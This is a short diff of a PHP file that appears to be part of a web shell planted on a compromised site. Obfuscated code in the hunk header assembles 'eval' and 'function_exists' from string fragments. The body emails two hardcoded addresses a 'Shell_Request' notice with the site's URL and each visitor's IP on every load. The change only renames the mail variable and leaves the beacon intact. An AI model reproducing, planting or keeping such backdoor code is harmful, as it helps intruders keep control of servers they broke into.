@@ -17,8 +17,8 @@ $ZlwBhrDSDRgGg='fun'.'ct'.'i'.'o'.'n_exi'.'s'.'ts';$WMKVyvv='e'.'v'.'a'.'l';$IXf
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$to = 'lambangwes@gmail.com, mrhorden007@gmail.com';
+$updateshell = 'lambangwes@gmail.com, mrhorden007@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($to, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+mail($updateshell, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
